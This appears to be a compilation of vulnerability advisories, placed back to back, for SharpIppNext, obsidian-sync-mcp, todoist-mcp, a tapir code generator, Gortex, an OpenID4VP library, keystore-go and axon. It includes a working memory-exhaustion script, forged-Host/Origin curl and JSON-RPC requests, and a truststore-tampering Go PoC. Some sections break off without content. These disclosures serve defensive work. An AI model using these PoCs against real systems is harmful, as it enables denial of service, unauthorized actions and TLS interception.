### Summary

SharpIppNext's `IppProtocol.ReadIppRequestAsync()` unconditionally copies the entire attacker-supplied IPP document payload into an unbounded `MemoryStream` with no size limit. Because this behavior is enabled by default (`ReadDocumentStream = true`) and the official server documentation shows `HttpContext.Request.Body` being passed directly to `ReceiveRequestAsync()` without authentication, an unauthenticated remote attacker can exhaust the server process's memory by sending an arbitrarily large IPP request body, causing an Out-Of-Memory (OOM) condition and denial of service.

> [!NOTE]
> This vulnerability only affects server-side implementations (using `SharpIppServer` to parse incoming IPP requests). It does not affect client-side implementations using `SharpIppClient` or client-side request construction.

### Details

The vulnerable sink is in `SharpIpp/Protocol/IppProtocol.cs`:

```csharp
// IppProtocol.cs:39 — enabled by default
public bool ReadDocumentStream { get; set; } = true;

// IppProtocol.cs:466–470 — no size cap on the copy
if (ReadDocumentStream)
{
    message.Document = new MemoryStream();
    await reader.BaseStream.CopyToAsync(message.Document);  // unbounded
    message.Document.Seek(0, SeekOrigin.Begin);
}
```

The full call chain from the public API to the vulnerable sink:

1. `docs/Content/Server/index.md:6–11` — Official server example passes `context.Request.Body` (unauthenticated) to `sharpIppServer.ReceiveRequestAsync(inputStream)`.
2. `SharpIpp/ISharpIppServer.cs:78` — Public API declaration: `Task<IIppRequest> ReceiveRequestAsync(Stream stream, ...)`.
3. `SharpIpp/SharpIppServer.cs:62–67` — `ReceiveRequestAsync(Stream)` overload delegates to `ReceiveRawRequestAsync(stream)`.
4. `SharpIpp/SharpIppServer.cs:52–58` — `ReceiveRawRequestAsync` calls `_ippProtocol.ReadIppRequestAsync(stream, ...)`.
5. `SharpIpp/Protocol/IppProtocol.cs:466–470` — `ReadIppRequestAsync` copies all remaining bytes after the IPP attribute section into a `new MemoryStream()` with no upper bound.

The existing validator (`IppRequestMessageValidator.ValidateStringLengthLimitsRule`, `IppRequestMessageValidator.cs:260`) only checks IPP attribute string/octet lengths after parsing; it does not constrain the document stream buffered at step 5.

Dynamic confirmation (Phase 2): a Docker-based PoC server built directly from the v4.0.2 source (commit `185343e`) was sent a 100 MB IPP document payload. The server responded `docLength=104857600`, confirming all 100 MB were buffered into a `MemoryStream` with no rejection.

### PoC

**1. Build and start the vulnerable server**

```bash
# From the repository root (build context: parent of vuln-001/)
docker build -t sharpipp-dos-poc -f vuln-001/Dockerfile \
  reports/pypiAi_973_danielklecha__SharpIppNext/

docker run --rm -d -p 8631:8631 --name sharpipp-dos-server sharpipp-dos-poc
```

The PoC server (`Program.cs`) uses the default `SharpIppServer` (which uses `IppProtocol` with `ReadDocumentStream = true`) and exposes a single unauthenticated POST endpoint:

```csharp
using SharpIpp;

var server = new SharpIppServer();
var app = WebApplication.Create();

app.MapPost("/", async ctx =>
{
    var req = await server.ReceiveRawRequestAsync(ctx.Request.Body);
    ctx.Response.ContentType = "text/plain";
    await ctx.Response.WriteAsync($"docLength={req.Document?.Length}\n");
});

app.Run("http://0.0.0.0:8631");
```

**2. Send the crafted IPP request**

```bash
python3 vuln-001/poc.py 127.0.0.1 8631 100
```

The PoC script (`poc.py`) builds a minimal valid IPP/2.0 Print-Job request (version + operation-id + request-id + operation-attributes-tag + two mandatory attributes + end-of-attributes-tag) followed by an attacker-controlled document body of the requested size, then sends it over HTTP.

**3. Expected output**

```
[*] Target          : http://127.0.0.1:8631/
[*] IPP header size : 72 bytes
[*] Document payload: 100 MB (104,857,600 bytes)
[*] Total request   : 104,857,672 bytes

[*] Sending request...
[*] HTTP status : 200
[*] Response    : docLength=104857600

[PASS] CONFIRMED: server buffered 104,857,600 bytes (100 MB) into MemoryStream with NO size limit.
[PASS] Vulnerable sink: IppProtocol.cs:469 reader.BaseStream.CopyToAsync(message.Document)
```

Increasing `doc_size_mb` (e.g., to 4096 or beyond available RAM) triggers process-level OOM on the target server.

**Recommended fix**

Add a configurable maximum document size and throw `client-error-request-entity-too-large` when exceeded:

```diff
a/SharpIpp/Protocol/IppProtocol.cs
+++ b/SharpIpp/Protocol/IppProtocol.cs
+        public long? MaxDocumentStreamBytes { get; set; } = 128L * 1024 * 1024;

             if (ReadDocumentStream)
             {
                 message.Document = new MemoryStream();
-                await reader.BaseStream.CopyToAsync(message.Document);
+                await CopyDocumentStreamAsync(reader.BaseStream, message.Document,
+                    message, MaxDocumentStreamBytes, cancellationToken).ConfigureAwait(false);
                 message.Document.Seek(0, SeekOrigin.Begin);
             }
```

### Impact

This is an unauthenticated network-reachable Denial of Service vulnerability. Any server that follows the official SharpIppNext documentation and passes an HTTP request body to `ReceiveRequestAsync()` or `ReceiveRawRequestAsync()` is vulnerable out of the box, because `ReadDocumentStream` defaults to `true` and no document size limit exists in the library.

An attacker with network access to the IPP endpoint can:

- Send a single HTTP POST request with an arbitrarily large body to exhaust the server process's heap memory.
- Trigger an OOM kill or `OutOfMemoryException`, crashing the ASP.NET host process and making the printer/IPP service unavailable.
- Repeat the attack trivially since no authentication is required and the exploit requires only a standard HTTP client.

Only consumers of SharpIppNext that expose an IPP server endpoint using `SharpIppServer` (e.g., print servers, document management systems, and IoT firmware) are affected. **Applications acting purely as clients (`SharpIppClient`) to query printers or submit jobs are not affected.**

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: Unbounded IPP Document Stream Buffering DoS
CVE candidate: SharpIppNext v4.0.1/v4.0.2 (CWE-400, CVSS 7.5)

Vulnerability: IppProtocol.ReadIppRequestAsync() copies the entire attacker-
controlled IPP document payload into a MemoryStream with no size limit:

    if (ReadDocumentStream)   // default: true
    {
        message.Document = new MemoryStream();
        await reader.BaseStream.CopyToAsync(message.Document);  // NO limit
        message.Document.Seek(0, SeekOrigin.Begin);
    }

An unauthenticated attacker sends a valid IPP header followed by an arbitrarily
large document body. The server buffers all bytes in memory, leading to OOM.

Usage:
    python3 poc.py [host] [port] [doc_size_mb]

    host         Target host (default: 127.0.0.1)
    port         Target port (default: 8631)
    doc_size_mb  Document payload size in MB (default: 100)

Expected result:
    Server responds with "docLength=<N>" where N equals doc_size_mb * 1024^2.
    This confirms all bytes were buffered into MemoryStream with no size check.
"""

import sys
import struct
import http.client
import time

def build_ipp_attr(tag: int, name: bytes, value: bytes) -> bytes:
    """Encode a single IPP attribute."""
    return (
        bytes([tag])
        + struct.pack(">H", len(name))
        + name
        + struct.pack(">H", len(value))
        + value
    )

def build_ipp_request(doc_size_bytes: int) -> bytes:
    """
    Build a minimal valid IPP/2.0 Print-Job request.

    Wire format:
        [2]  version-number     0x0200  (IPP 2.0)
        [2]  operation-id      0x0002  (Print-Job)
        [4]  request-id        0x00000001
        [1]  delimiter         0x01    (operation-attributes-tag)
        [N]  attributes        attributes-charset + attributes-natural-language
        [1]  delimiter         0x03    (end-of-attributes-tag)
        [M]  document-data     <arbitrary payload — the attack surface>
    """
    # IPP header: version 2.0, Print-Job, request-id 1
    header = struct.pack(">HHI", 0x0200, 0x0002, 0x00000001)

    # Operation attributes group
    attrs = bytes([0x01])  # operation-attributes-tag
    attrs += build_ipp_attr(0x47, b"attributes-charset", b"utf-8")
    attrs += build_ipp_attr(0x48, b"attributes-natural-language", b"en")
    attrs += bytes([0x03])  # end-of-attributes-tag

    # Document payload: attacker-controlled bytes after end-of-attributes
    # CopyToAsync will buffer ALL of these into a MemoryStream
    document = b"X" * doc_size_bytes

    return header + attrs + document

def run_poc(host: str, port: int, doc_size_mb: int) -> bool:
    """
    Send the crafted IPP request and verify the server echoes the full docLength.

    Returns True (PASS) if the server confirms unbounded buffering.
    """
    doc_size_bytes = doc_size_mb * 1024 * 1024
    payload = build_ipp_request(doc_size_bytes)

    ipp_header_len = len(payload) - doc_size_bytes
    print(f"[*] Target          : http://{host}:{port}/")
    print(f"[*] IPP header size : {ipp_header_len} bytes")
    print(f"[*] Document payload: {doc_size_mb} MB ({doc_size_bytes:,} bytes)")
    print(f"[*] Total request   : {len(payload):,} bytes")
    print(f"[*] Expected docLength in response: {doc_size_bytes}")
    print()

    print(f"[*] Sending request...")
    t0 = time.time()
    try:
        conn = http.client.HTTPConnection(host, port, timeout=180)
        conn.request(
            "POST",
            "/",
            body=payload,
            headers={
                "Content-Type": "application/ipp",
                "Content-Length": str(len(payload)),
            },
        )
        response = conn.getresponse()
        body = response.read().decode("utf-8", errors="replace").strip()
        elapsed = time.time() - t0
    except Exception as exc:
        print(f"[FAIL] Connection error: {exc}")
        return False

    print(f"[*] HTTP status : {response.status}")
    print(f"[*] Response    : {body}")
    print(f"[*] Round-trip  : {elapsed:.2f}s")
    print()

    expected = f"docLength={doc_size_bytes}"
    if expected in body:
        print(
            f"[PASS] CONFIRMED: server buffered {doc_size_bytes:,} bytes ({doc_size_mb} MB) "
            f"into MemoryStream with NO size limit."
        )
        print(
            f"[PASS] Vulnerable sink: IppProtocol.cs:469 "
            f"reader.BaseStream.CopyToAsync(message.Document)"
        )
        return True
    else:
        print(f"[FAIL] Expected '{expected}' in response, got: {body!r}")
        return False

def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8631
    doc_size_mb = int(sys.argv[3]) if len(sys.argv) > 3 else 100

    success = run_poc(host, port, doc_size_mb)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
```

When obsidian-sync-mcp runs without MCP_AUTH_TOKEN (the documented no-auth mode for local use), the HTTP MCP endpoint does not validate the Host or Origin header before dispatching MCP methods (CWE-350). The no-auth mode's "local network only" assumption therefore does not hold: a malicious web page the operator visits can use DNS rebinding to resolve an attacker-controlled hostname to 127.0.0.1 (or the operator's LAN/VPN/Docker-published address) and issue requests the server accepts as trusted local calls, reaching the full tool surface (read_note, write_note, edit_note, delete_note, move_note, list_notes, list_folders, list_tags, get_note_metadata).

Affected versions: <= 0.5.6
Patched version: 0.5.7

## Impact

Any deployment running without MCP_AUTH_TOKEN — including the README "Filesystem mode (simplest)" quickstart and the self-hosted docker-compose setup (where MCP_AUTH_TOKEN defaults to empty)" — is exposed to any website the operator visits while the server is running. That page's JavaScript can silently read the entire vault and create/overwrite/delete/move notes, with no credentials and no prompt. In CouchDB/Self-hosted LiveSync mode, the same code path applies, so vault content in CouchDB is equally reachable. Deployments that set MCP_AUTH_TOKEN are not affected — a bearer token is not attached by browsers, so a forged request returns HTTP 401.

## Remediation

Upgrade to 0.5.7, which validates both the Host and Origin headers in no-auth mode: any request whose Host is not localhost/127.0.0.1/::1 (or a value in the new MCP_ALLOWED_HOSTS), or that carries a cross-origin Origin not in that allowlist, is rejected before any MCP method runs. The Host check defeats DNS rebinding; the Origin check defeats the related bypass where a page directly fetches http://127.0.0.1:<port>/mcp (genuine loopback Host, attacker Origin) — the transport's wildcard CORS would otherwise expose the response. Non-browser MCP clients send no Origin, so they are unaffected. These checks block browser-delivered attacks only; a direct non-browser network client can still forge both headers, so on untrusted networks set MCP_AUTH_TOKEN.

Workaround (any version): set MCP_AUTH_TOKEN to require authentication — this closes the path immediately.

## Technical detail

In no-auth mode serverOptions.authenticate was never installed, so FastMCP dispatched every request with no per-request check. Even with a token, only the Authorization header was inspected — nothing in the server, fastmcp, or mcp-proxy validated Host/Origin. Two browser-reachable variants follow: (1) classic DNS rebinding, where the browser sends the attacker's hostname in Host; and (2) a direct cross-origin fetch() to the loopback address, where Host is genuinely 127.0.0.1 but Origin is attacker-controlled and the transport's wildcard Access-Control-Allow-Origin: * exposes the response — no rebinding required. The 0.5.7 fix adds an application-layer Host+Origin check in authenticate that rejects such requests before dispatch; it is a compensating control and does not alter the wildcard CORS header itself (the rejection happens before any response body is produced).

## Proof of concept (mitigated in 0.5.7)
```
# No-auth server (per the README quickstart)
VAULT_PATH=/tmp/demo-vault HOST=127.0.0.1 PORT=8787 npx tsx src/main.ts

# Forged Host/Origin (what a DNS-rebinding page's fetch() sends) reaches the tools with no credential:
curl -s -i http://127.0.0.1:8787/mcp \
  -H "Host: attacker.example" -H "Origin: http://attacker.example" \
  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'
# -> HTTP 200; a follow-up tools/call to write_note creates a file in the vault, no Authorization header.
# The same sequence against a server with MCP_AUTH_TOKEN set returns HTTP 401.
```

```
# Variant 2 — no rebinding needed: real loopback Host, attacker Origin.
# In <= 0.5.6 this returns 200 and executes tools; in 0.5.7 it returns 403.
curl -s -i http://127.0.0.1:8787/mcp \
  -H "Host: 127.0.0.1:8787" -H "Origin: http://attacker.example" \
  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'
```

cves.summary:
The OpenAPI code generator (tapir-openapi-codegen-core) builds Scala source by string templating and emitted several names/values from the (untrusted) OpenAPI document without escaping or validation, allowing injection of arbitrary Scala that runs at generated-code compile time and/or endpoint-assembly time (build/codegen-time RCE from an attacker-controlled spec).

This advisory covers the full class of sinks, all sharing one root cause and one fix (PR #5395, commit e015939b7): object property names (-> case-class fields), query/header/path parameter names (-> endpoint input DSL), and operation tags (-> .tags(List(...))). The fix routes identifier-position names through validation/quoting and string-literal values through JavaEscape.escapeString.

Consolidates the separately-reported query-param (GHSA-h3vr-jggp-jw5v), header-param (GHSA-3pjr-m3pf-r66v) and tag (GHSA-jc99-w66r-pcx5) sinks, which are the same issue.

The self-hosted `todoist-mcp-http` server accepts browser-origin MCP requests with attacker-controlled `Host` and `Origin` headers. A malicious website can use DNS rebinding to route its own origin to a victim's local `127.0.0.1` MCP server, then invoke Todoist MCP tools without a caller credential.

This affects `github.com/Doist/todoist-mcp` at commit `d2903e0d945d2a559d71c091337ad6380511e62f`, package version `10.3.1`, when the optional Streamable HTTP server is running. The stdio entrypoint is not browser-reachable. The vulnerable browser-reachable component is `todoist-mcp-http`.

The documented HTTP server mode runs all MCP tools with the operator's `TODOIST_API_KEY` and binds to loopback by default:

```bash
TODOIST_API_KEY=your-key npx -p @doist/todoist-mcp todoist-mcp-http
```

`src/main-http.ts:28-30` sets the HTTP bind host and port:

```ts
const PORT = Number.parseInt(process.env.PORT || '3000', 10)
const HOST = process.env.HOST || '127.0.0.1'
const LISTEN_HOST = normalizeListenHost(HOST)
```

`src/main-http.ts:88-99` dispatches `POST /mcp` to `StreamableHTTPServerTransport` without validating `Host` or `Origin`:

```ts
app.post(
    '/mcp',
    requireValidTodoistToken({ type: 'static', apiKey: todoistApiKey, baseUrl }),
    async (req: Request, res: Response) => {
        const transport = new StreamableHTTPServerTransport({
            sessionIdGenerator: undefined,
        })

        const server = getMcpServer({ todoistApiKey, baseUrl })
        await server.connect(transport)
        await transport.handleRequest(req, res, req.body)
    },
)
```

`src/middleware/require-valid-todoist-token.ts:105-117` validates the configured server-side Todoist token and then forwards the request. It does not authenticate the browser caller:

```ts
const valid = await getValidation()

if (valid) {
    next()
    return
}
```

`src/mcp-server.ts:215-285` registers Todoist read and write tools against the server-side Todoist API client, including `add-tasks`, `complete-tasks`, `update-tasks`, `delete-object`, comments, reminders, labels, filters, goals, and assignments.

## Proof of concept

Start the upstream local HTTP server with an operator-owned Todoist test account:

```bash
git clone https://github.com/Doist/todoist-mcp.git
cd todoist-mcp
git checkout d2903e0d945d2a559d71c091337ad6380511e62f
npm ci --ignore-scripts
npm run build

export TODOIST_API_KEY='<Todoist test account API token>'
PORT=8082 HOST=127.0.0.1 node dist/main-http.js
```

The server prints:

```text
Todoist MCP HTTP Server started on 127.0.0.1:8082
MCP endpoint: http://127.0.0.1:8082/mcp
```

From a browser page using DNS rebinding, route the attacker origin to `127.0.0.1:8082` and send MCP JSON-RPC requests to `POST /mcp`.

First enumerate tools. The rebound browser session can list Todoist write tools such as `add-tasks` and `complete-tasks`.

Call `user-info`:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "user-info",
    "arguments": {}
  }
}
```

Observed result: the response returns the Todoist account tied to the server-held `TODOIST_API_KEY`.

Create a disposable task:

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "add-tasks",
    "arguments": {
      "tasks": [
        {
          "content": "DNS REBINDING DEMO - attacker-created task",
          "description": "Created through browser-origin DNS rebinding against local todoist-mcp-http.",
          "priority": "p1",
          "dueString": "today"
        }
      ]
    }
  }
}
```

Observed result: Todoist creates the task and the MCP response returns the new task ID.

Complete the same task:

```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "complete-tasks",
    "arguments": {
      "ids": [
        "<RETURNED_TASK_ID>"
      ]
    }
  }
}
```

Observed result: the MCP response returns `successCount: 1`, and the Todoist UI shows the same task completed.

[demo video](https://drive.google.com/file/d/1zfgYQS-vbi1zc8N2JayShtwBCZbN-doG/view)

## Impact

A public website can operate a victim's local `todoist-mcp-http` server when the optional HTTP transport is running. The browser does not supply a Todoist API token. The MCP server supplies its configured `TODOIST_API_KEY`.

The demonstrated impact is Todoist task creation and completion. The same browser-origin path exposes the rest of the registered Todoist write surface, including task updates, task rescheduling, project and section changes, comments, reminders, filters, labels, goals, assignments, and object deletion.

This violates the browser-origin boundary. A user can run the MCP server only on loopback and still become reachable from an unrelated public website because DNS rebinding preserves the attacker's `Host` and `Origin` while routing the TCP connection to `127.0.0.1`.

## Why this is a vulnerability

- The default HTTP bind target is loopback, which users reasonably treat as local-only.
- DNS rebinding makes loopback HTTP reachable from a public website unless the server validates `Host` and `Origin`.
- The MCP route does not require a per-request caller secret.
- The middleware validates the server's Todoist backend token, not the browser caller.
- Tool execution uses the server-held `TODOIST_API_KEY` to mutate Todoist state.

## Remediation

Add strict `Host` validation before MCP dispatch. For local deployments, accept only explicit loopback hostnames such as `127.0.0.1`, `localhost`, `[::1]`, and any operator-configured trusted names.

Reject browser requests with missing or untrusted `Origin` values before they reach `StreamableHTTPServerTransport`.

Require a per-run local bearer token or equivalent caller secret for HTTP MCP mode, including loopback deployments. Host and Origin validation reduce DNS-rebinding exposure, but they are not caller authentication.

Enable DNS rebinding protection in the MCP SDK HTTP transport if available, and pass explicit allowed host and origin lists. Keep stdio as the safest default local transport.

## Reporter

Avishai Gonen - Pluto Security

### Summary
Gortex is an MCP server exposing `write_file`, `edit_file`, and `move_inline` tools. `resolveFilePath` **exempts absolute paths** from confinement, and the write handlers — unlike `read_file` / `get_symbol_source` — **never call `guardSymlinkWithinRepo`**. A single MCP `write_file` call with an absolute path writes any file the daemon user can, **outside every indexed repo root** (`AtomicWriteFile`'s `MkdirAll` auto-creates missing parents). Writing `~/.zshrc`, `~/.bashrc`, `.git/hooks/pre-commit`, or a cron/systemd unit yields code execution on the next shell/commit. This directly violates the project's own `SECURITY.md` invariant *"File-path resolution is **confined to indexed repository roots**"*

### Affected
`internal/mcp/tools_fileops.go` (+ `tools_move_inline.go`), HEAD `28fa017` (v0.53.0).
**CWE-22** (Path Traversal) / **CWE-73** (External Control of File Name/Path) → **CWE-94** (code execution).

### Vulnerable code
`internal/mcp/tools_fileops.go:54-62` `resolveFilePath` exempts absolute paths from the repo-root confinement; the write sink at `:793` (`AtomicWriteFile`, `write_file`) and `:676` (`edit_file`) run with **no** `guardSymlinkWithinRepo`. The asymmetry is the bug: `read_file` (`:940`) and `get_symbol_source` **do** call `guardSymlinkWithinRepo`; the write path does not.

### PoC (executed)

## Summary

`ChainBuilder` (the private RFC 5280 validator behind `TrustEvaluator` and the public credential-parsing API) terminated chain building on **Subject Distinguished Name string equality** rather than on cryptographic closure to a trust anchor. A certificate whose Subject DN string matched a trusted anchor's Subject DN was accepted as the chain terminus **with no signature verification** against the anchor's public key.

An attacker who mints a self-signed certificate and copies a trusted anchor's Subject DN string onto it can therefore have that certificate — and any credential signed with its private key — accepted as issued under a trusted authority.

## Impact

A relying party using `@openeudi/openid4vp` to verify OpenID4VP presentations (mdoc / SD-JWT VC) could be induced to accept a **forged credential as genuine**, defeating the trust-anchor model. In an eIDAS / EUDI age- or identity-verification deployment this permits impersonation of a trusted issuer.

Exploitable through the public verification path: `TrustEvaluator.evaluate()` returns a successful result (and, due to a secondary fallback, attributes the forged leaf to a real anchor's metadata), so downstream callers see a trusted outcome.

## Details

`src/trust/ChainBuilder.ts`, `tryBuild()`:

```js
while (current.subject !== anchor.subject) { /* verify & climb */ }
// loop exits when current.subject === anchor.subject
return chain;  // returned WITHOUT verifying `current` against the anchor
```

The signature-verified closure path (`if (!issuer)` -> `verifySignature(current, anchor)`) is correct, but the `while` guard provides a second, unverified exit: when a supplied certificate (the leaf, or an attacker-supplied intermediate) has a Subject DN string equal to the anchor's, the loop body never runs, no `verifySignature` call is made, and the chain is returned as valid. The per-certificate checks that do run (validity, algorithm, keyUsage) all operate on the attacker-controlled certificate and do not bind it to the anchor.

Secondary contributing weakness (`src/trust/TrustEvaluator.ts`): the anchor selected for the result was matched by `serialNumber` and **fell back to `anchors[0]`** when no match was found, so the forged leaf was reported alongside a genuine anchor's `trustedAuthorityIds` / provenance.

## Proof of Concept

```js
// Attacker mints a self-signed cert reusing a trusted anchor's Subject DN.
const impostor = selfSigned({ subject: trustedAnchor.subject /* string */ });
// Vulnerable: resolves to a valid chain [impostor] with no signature check.
await new ChainBuilder().build(impostor, [trustedAnchor]);
```

## Patch

`ChainBuilder.tryBuild()` now requires the terminating certificate to be **byte-identical to the trust anchor** (DER `rawData` comparison) when the loop exits on DN equality; otherwise it throws `CertificateChainError` with `reason: "signature"`. Cryptographic closure via `verifySignature(current, anchor)` remains the only other accepted termination. As defense-in-depth, `TrustEvaluator` now selects the terminating anchor by DER byte-identity and throws instead of silently falling back to the first candidate. Fixed in `0.8.1`.

## Workarounds

None. Upgrade to `0.8.1`.

## Credits

Reported by **Reza Shokri** — Quellkern e.U. (https://augenmass.tech), GitHub [@devdotbo](https://github.com/devdotbo). Thanks for the thorough report, the self-contained reproduction, and coordinated disclosure.

### Summary
`keystore.Decode()` fails to check the error returned when reading the trailing SHA-1 integrity digest of a JKS keystore. If an attacker removes the final 20 bytes from a `.jks` file, the digest read returns an empty slice and the byte-comparison loop never executes, so `Decode()` returns the parsed keystore with `err == nil`. This defeats both tamper detection and — for certificate-only truststores — the password check itself, allowing an attacker with write access to a keystore file (but without knowledge of the keystore password) to silently inject or replace trusted CA certificates.

### Details
**Affected versions:** `github.com/pavel-v-chernykh/keystore-go` ≤ `v2.1.0+incompatible` (the final release on this module path).  v3 and v4 releases are not impacted.

In `decoder.go`, function `Decode`, lines 264-272:

```go
computedDigest := ksd.md.Sum(nil)
actualDigest, err := ksd.readBytes(uint32(ksd.md.Size()))
for i := 0; i < len(actualDigest); i++ {
    if actualDigest[i] != computedDigest[i] {
        return nil, ErrInvalidDigest
    }
}

return keyStore, nil
```

Two defects combine here:

1. The `err` returned by `ksd.readBytes(20)` on line 265 is assigned but never inspected.
2. The comparison loop on line 266 is bounded by `len(actualDigest)` rather than `len(computedDigest)`.

`readBytes` (`decoder.go` lines 75-94) reads the requested bytes via `io.ReadFull`; on EOF/short read it returns `(nil, ErrIo)`:

```go
_, err := io.ReadFull(ksd.r, ksd.b[:blockSize])
if err != nil {
    return result, ErrIo
}
```

When the trailing 20-byte digest is absent from the input stream, `actualDigest` is therefore `nil`, `len(actualDigest) == 0`, the `for` loop body never executes, and `Decode()` falls through to `return keyStore, nil`.

The JKS format's only integrity guarantee is this trailing `SHA1(passwordBytes || "Mighty Aphrodite" || body)` digest. For truststores containing only `TrustedCertificateEntry` values it is also the *only* place the password is verified. Consequently:

- An attacker who can modify a `.jks` truststore on disk — but does **not** know the keystore password — can replace or add trusted CA certificates, drop the last 20 bytes of the file, and the consuming Go process will load the forged truststore as valid.
- After the digest is stripped, `Decode()` accepts **any** password, so operators who believe the password gates integrity receive no error even when the wrong password is supplied.

The reference Java `JavaKeyStore` implementation reads the digest with `DataInputStream.readFully` and throws on short read; this Go port diverges from that behaviour.

### PoC
```
go mod init poc
go get github.com/pavel-v-chernykh/keystore-go@v2.1.0+incompatible
go run .
```

```go
package main

import (
        "bytes"
        "fmt"
        "os"

        keystore "github.com/pavel-v-chernykh/keystore-go"
)

func main() {
        originalCert := []byte("ORIGINAL-TRUSTED-CA-CERTIFICATE")
        evilCert := []byte("EVIL-ATTACKER-CA-CERTIFICATE!!!") // same length

        ks := keystore.KeyStore{
                "trusted-ca": &keystore.TrustedCertificateEntry{
                        Certificate: keystore.Certificate{
                                Type:    "X509",
                                Content: originalCert,
                        },
                },
        }

        var buf bytes.Buffer
        if err := keystore.Encode(&buf, ks, []byte("correct-password")); err != nil {
                panic(err)
        }
        legit := buf.Bytes()
        fmt.Printf("[*] Legitimate keystore: %d bytes (last 20 = SHA-1 digest)\n", len(legit))

        // Sanity: untampered keystore with WRONG password is rejected.
        _, err := keystore.Decode(bytes.NewReader(legit), []byte("wrong-password"))
        fmt.Printf("[*] Decode(legit, wrong-password) -> err=%v  (expected ErrInvalidDigest)\n", err)

        // Attacker: tamper with the certificate, then strip the 20-byte digest.
        tampered := bytes.Replace(append([]byte(nil), legit...), originalCert, evilCert, 1)
        tampered = tampered[:len(tampered)-20] // remove trailing SHA-1 digest entirely

        // 1) Tampered keystore + CORRECT password: integrity check should fail.
        out, err := keystore.Decode(bytes.NewReader(tampered), []byte("correct-password"))
        if err == nil {
                entry := out["trusted-ca"].(*keystore.TrustedCertificateEntry)
                fmt.Printf("\n[BYPASS] Tampered keystore accepted with correct password.\n")
                fmt.Printf("         Trusted cert content: %q\n", entry.Certificate.Content)
        } else {
                fmt.Printf("[ok] tampered keystore rejected: %v\n", err)
                os.Exit(1)
        }

        // 2) Tampered keystore + WRONG password: should also fail.
        out2, err2 := keystore.Decode(bytes.NewReader(tampered), []byte("attacker-does-not-know"))
        if err2 == nil {
                entry := out2["trusted-ca"].(*keystore.TrustedCertificateEntry)
                fmt.Printf("[BYPASS] Tampered keystore accepted with WRONG password.\n")
                fmt.Printf("         Trusted cert content: %q\n", entry.Certificate.Content)
        } else {
                fmt.Printf("[ok] wrong password rejected: %v\n", err2)
                os.Exit(1)
        }
}
```

Expected output:

```
[*] Legitimate keystore: 97 bytes (last 20 = SHA-1 digest)
[*] Decode(legit, wrong-password) -> err=keystore: invalid digest  (expected ErrInvalidDigest)

[BYPASS] Tampered keystore accepted with correct password.
         Trusted cert content: "EVIL-ATTACKER-CA-CERTIFICATE!!!"
[BYPASS] Tampered keystore accepted with WRONG password.
         Trusted cert content: "EVIL-ATTACKER-CA-CERTIFICATE!!!"
```

### Impact
Any application that uses `keystore.Decode()` to load a JKS truststore and relies on the keystore password for tamper evidence is affected. An attacker who can write to the `.jks` file (local user, compromised deployment artefact, writable config volume, etc.) but does **not** know the keystore password can replace trusted CA certificates undetected. Downstream, this typically enables man-in-the-middle interception of TLS connections that trust the forged CA, compromising confidentiality and integrity of those connections. No authentication to the target application is required beyond file-write access; no user interaction is required.

This defect was fixed in commit `af93effd832cf1aef7794e69c31e1b668e17b851` (2019-09-16, "Update to go1.13"), which added an `if err != nil { return … }` guard after reading the trailing digest and replaced the length-of-actual loop with a full-length `bytes.Compare(actualDigest, computedDigest)`. That commit first shipped in tag **v3.0.0**. There is no fixed release on the bare `github.com/pavel-v-chernykh/keystore-go` module path — every release there (`v1.0.0` through `v2.1.0+incompatible`) predates the fix. The fixed code is available under the successor module paths:

- `github.com/pavel-v-chernykh/keystore-go/v3` ≥ v3.0.0
- `github.com/pavel-v-chernykh/keystore-go/v4` ≥ v4.0.0
- `github.com/pavlo-v-chernykh/keystore-go/v4` ≥ v4.0.0 (repository renamed at v4.4.0; the Go module proxy serves all v4.x under both spellings)

Users of the legacy `v2` module path remain exposed and should migrate to `github.com/pavlo-v-chernykh/keystore-go/v4`.

### Summary
axon rtk-install downloads a pre-built rtkx binary from GitHub releases and executes it via subprocess.run() on every text-compression call, without verifying its integrity — no checksum, signature, or attestation check anywhere in the download/install path. If the release pipeline or a maintainer token for sammyjdev/rtkx were ever compromised, every axon user who installs or auto-bootstraps rtkx would silently download and execute an unverified binary with the same privileges as the axon process.

### Details
The download path lives in src/axon/context/rtk_bootstrap.py:

- _http_download() fetches the release archive over HTTPS via urllib.request.urlopen() and writes the raw response bytes to disk — no hash comparison against any published value.
- _extract_binary() unpacks the archive (zip/tar.gz) and sets the executable bit (out.chmod(... S_IXUSR | S_IXGRP | S_IXOTH)), again with no verification step.
- There is no reference to checksum, sha256, verify, signature, gpg, cosign, or sigstore anywhere in this file.

The binary is not dead code — it's on the active execution path. src/axon/context/rtk.py::rtk_binary_path() resolves to the bootstrapped binary at ~/.axon/bin/rtkx, and compress_text_with_rtk() invokes it directly:

`
result = subprocess.run(
    [path, "read", str(tmp_path)],
    capture_output=True, text=True, timeout=timeout_seconds,
)`

### PoC
This is a missing-control finding rather than an active exploit, so reproduction is by code audit rather than a live payload:

Clone sammyjdev/axon and open src/axon/context/rtk_bootstrap.py.
Confirm _http_download() and _extract_binary() perform no hash/signature check before chmod +x.
Trace the call chain: bootstrap_rtkx() → _http_download() → _extract_binary() → rtk_binary_path() (in rtk.py) → subprocess.run() in compress_text_with_rtk().
Optionally demonstrate impact safely: point download_url() / the download callable (already injectable per the module's own docstring, "the download step is injectable so the extraction logic is testable offline") at a local HTTP server serving an attacker-controlled archive, and confirm it gets extracted, chmod +x'd, and executed with no rejection.

### Impact
Type: CWE-494 (Download of Code Without Integrity Check), 
leading to potential arbitrary code execution.
Who's affected: Any axon user who runs axon rtk-install or triggers auto-bootstrap, if sammyjdev/rtkx's release pipeline or a maintainer's release credentials are ever compromised. Not exploitable today without that precondition, but the missing control removes the last line of defense against a supply-chain compromise of the binary dependency.

### Summary

